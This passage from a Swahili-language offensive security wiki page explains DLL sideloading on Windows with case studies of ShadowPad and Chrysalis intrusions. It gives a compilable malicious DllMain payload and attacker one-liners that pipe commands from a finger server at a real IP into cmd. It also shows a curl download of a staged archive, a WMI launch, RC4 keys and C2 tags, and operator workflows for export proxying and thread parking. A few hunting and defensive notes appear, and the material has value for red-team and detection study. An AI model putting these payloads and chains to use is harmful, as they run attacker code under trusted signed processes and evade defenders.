- Dropper inaandika legitimate, signed EXE na malicious DLL kwenye directory ileile (mfano pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wakati signed EXE inapoanzishwa, Windows DLL search order inapakia wsc.dll kutoka working directory kwanza, ikitekeleza attacker code chini ya signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Tafuta entries zinazotekeleza executables au VBScript. Mfano wa suspicious pattern: LaunchApplication ikitekeleza embedded file nyuma.
- Katika Orca (Microsoft Orca.exe), kagua CustomAction, InstallExecuteSequence na Binary tables.
- Embedded/split payloads katika MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Au tumia lessmsi: lessmsi x package.msi C:\out
- Tafuta multiple small fragments zinazounganishwa na decryptwa na VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Weka faili hizi mbili katika folda moja:
- wsc_proxy.exe: host halali iliyosainiwa (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye saraka yake.
- wsc.dll: DLL ya mshambulizi. Ikiwa hakuna exports mahususi zinazohitajika, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na forward exports zinazohitajika kwenda kwenye library halisi huku payload ikiendeshwa ndani ya DllMain.
- Tengeneza minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya export, tumia proxying framework (kwa mfano, DLLirant/Spartacus) kutengeneza forwarding DLL ambayo pia inatekeleza payload yako.

- Technique hii inategemea DLL name resolution na host binary. Ikiwa host inatumia absolute paths au safe loading flags (kwa mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri precedence na lazima zizingatiwe wakati wa kuchagua host binary na export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ilielezea jinsi Ink Dragon inavyosambaza ShadowPad kwa kutumia **three-file triad** ili kuchanganyika na software halali huku ikiweka core payload encrypted kwenye disk:

1. **Signed host EXE** – vendors kama AMD, Realtek, au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Washambulizi hubadilisha jina la executable ili lionekane kama Windows binary (kwa mfano `conhost.exe`), lakini Authenticode signature inabaki valid.
2. **Malicious loader DLL** – huachwa kando ya EXE kwa jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL huwa mara nyingi MFC binary iliyofichwa kwa ScatterBrain framework; kazi yake pekee ni kutafuta encrypted blob, ku-decrypt, na reflectively map ShadowPad.
3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye directory hiyo hiyo. Baada ya memory-mapping decrypted payload, loader hufuta faili la TMP ili kuharibu ushahidi wa forensic.

Tradecraft notes:

* Kubadilisha jina la signed EXE (huku OriginalFileName ya asili ikiendelea kubaki kwenye PE header) huiruhusu ijifanye kama Windows binary lakini iendelee kubeba vendor signature, hivyo replicate tabia ya Ink Dragon ya kudondosha binaries zinazofanana na `conhost.exe` ambazo kwa kweli ni AMD/NVIDIA utilities.
* Kwa sababu executable hubaki trusted, controls nyingi za allowlisting zinahitaji tu malicious DLL lako liwe pembeni yake. Zingatia kubinafsisha loader DLL; signed parent kwa kawaida inaweza kuendeshwa bila kubadilishwa.
* ShadowPad decryptor inatarajia TMP blob iwe karibu na loader na iwe writable ili iweze ku-zero file baada ya mapping. Weka directory writable hadi payload ipakie; ikishaingia kwenye memory TMP file inaweza kufutwa salama kwa OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators huunganisha DLL sideloading na LOLBAS ili artifact pekee ya custom kwenye disk iwe malicious DLL kando ya trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell huanzisha `cmd.exe /c`, huchota commands kutoka Finger server, na kuzipitisha kwa `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` huchota TCP/79 text; `| cmd` hu- execute response ya server, ikiruhusu operators kubadilisha stage ya pili upande wa server.

- **Built-in download/extract:** Pakua archive yenye extension isiyo na madhara, ifungue, na stage sideload target pamoja na DLL chini ya random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` huficha progress na kufuata redirects; `tar -xf` hutumia built-in tar ya Windows.

- **WMI/CIM launch:** Anzisha EXE kupitia WMI ili telemetry ionyeshe CIM-created process wakati inaload DLL iliyo karibu nayo:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Hufanya kazi na binaries zinazo-prefer local DLLs (kwa mfano, `intelbq.exe`, `nearby_share.exe`); payload (kwa mfano, Remcos) huendesha chini ya jina trusted.

- **Hunting:** Alert on `forfiles` when `/p`, `/m`, na `/c` zinapatikana pamoja; si kawaida nje ya admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uvamizi wa hivi karibuni wa Lotus Blossom ulitumia vibaya trusted update chain kuwasilisha NSIS-packed dropper iliyostage DLL sideload pamoja na fully in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiweka **HIDDEN**, hudondosha renamed Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll`, na encrypted blob `BluetoothService`, kisha huzindua EXE.
- Host EXE hu-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hufanya mmap-load ya blob; `LogWrite` hui-decrypt kwa custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material inayotokana na hash ya awali), hu-overwrite buffer kwa plaintext shellcode, hufree temps, na kuruka kwenda kwake.
- Ili kuepuka IAT, loader hu-resolve APIs kwa ku-hash export names kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha dhidi ya salted target hashes.

Main shellcode (Chrysalis)
- Hadecrypt PE-like main module kwa kurudia add/XOR/sub na key `gQ2JR&9;` kwa passes tano, kisha dynamically hu-load `Kernel32.dll` → `GetProcAddress` ili kumaliza import resolution.
- Hu-reconstruct DLL name strings wakati wa runtime kupitia per-character bit-rotate/XOR transforms, kisha hu-load `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia second resolver inayopita **PEB → InMemoryOrderModuleList**, huchambua kila export table kwa 4-byte blocks kwa Murmur-style mixing, na hurudi kwenye `GetProcAddress` tu ikiwa hash haijapatikana.

Embedded configuration & C2
- Config huishi ndani ya faili lililodondoshwa `BluetoothService` katika **offset 0x30808** (size **0x980**) na hu-decryptwa kwa RC4 na key `qwhvb^435h&*7`, ikifichua C2 URL na User-Agent.
- Beacons hujenga dot-delimited host profile, huongeza tag `4Q`, kisha hu- encrypt kwa RC4 na key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Responses hu-decryptwa kwa RC4 na kusambazwa na tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode hu-gated na CLI args: no args = install persistence (service/Run key) ikielekeza kwa `-i`; `-i` huanzisha tena self na `-k`; `-k` huruka install na huendesha payload.

Alternate loader observed
- Uvamizi huohuo ulidondosha Tiny C Compiler na kuendesha `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, pamoja na `libtcc.dll` pembeni yake. Attacker-supplied C source ilibeba shellcode, ika-compile, na kuendeshwa in-memory bila kugusa disk na PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hatua hii ya compile-and-run inayotumia TCC iliimport `Wininet.dll` wakati wa runtime na kuvuta shellcode ya stage ya pili kutoka kwa hardcoded URL, ikitoa loader yenye kubadilika ambayo hujifanya kama run ya compiler.

## Signed-host sideloading with export proxying + host thread parking

Baadhi ya DLL sideloading chains huongeza **stability engineering** ili host halali ibaki hai muda wa kutosha kupakia later stages kwa usafi badala ya kucrash baada ya malicious DLL kupakiwa.

Observed pattern
- Dondosha trusted EXE kando ya malicious DLL kwa kutumia jina la dependency linalotarajiwa kama `version.dll`.
- Malicious DLL **huproxy kila expected export** kurudi kwenye real system DLL (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili import resolution bado ifanikiwe na host process iendelee kufanya kazi.
- Baada ya kupakiwa, malicious DLL **hupatch host entry point** ili main thread iingie kwenye infinite `Sleep` loop badala ya kutoka au kuendesha code paths ambazo zingekomesha process.
- Thread mpya hufanya kazi halisi ya uovu: decrypting jina au path ya next-stage DLL (RC4/XOR ni za kawaida), kisha kuiload kwa `LoadLibrary`.

Why this matters
- Normal DLL proxying huhifadhi API compatibility, lakini haihakikishi host ibaki hai muda wa kutosha kwa later stages.
- Kuegesha main thread kwenye `Sleep(INFINITE)` ni njia rahisi ya kuweka signed process iendelee kuwepo wakati loader inafanya decryption, staging, au network bootstrap kwenye worker thread.
- Hunting tu kwa suspicious `DllMain` inaweza kukosa pattern hii ikiwa tabia ya kuvutia inatokea baada ya host entry point kupatchiwa na secondary thread kuanza.

Minimal workflow
1. Nakili signed host EXE na tambua DLL ambayo inasuluhishwa kutoka kwenye local directory.
2. Jenga proxy DLL inayosafirisha functions zilezile na kuziforward kwenda kwenye legitimate DLL.
3. Katika `DllMain(DLL_PROCESS_ATTACH)`, tengeneza worker thread.
4. Kutoka kwenye thread hiyo, patch host entry point au main thread start routine ili iendelee kwenye `Sleep`.
5. Decrypt jina/config la next-stage DLL na piga `LoadLibrary` au manual-map payload.

Defensive pivots
- Signed processes zinazopakia `version.dll` au libraries nyingine za kawaida kutoka kwenye application directory yao wenyewe badala ya `System32`.
- Memory patches kwenye process entry point muda mfupi baada ya image load, hasa jumps/calls zilizoelekezwa upya kwenda `Sleep`/`SleepEx`.
- Threads zilizoundwa na proxy DLL ambazo mara moja hupiga `LoadLibrary` kwenye second DLL yenye jina lililodecryptiwa.
- Full-export proxy DLLs zilizowekwa kando ya vendor executables ndani ya writable staging directories kama `ProgramData`, `%TEMP%`, au unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
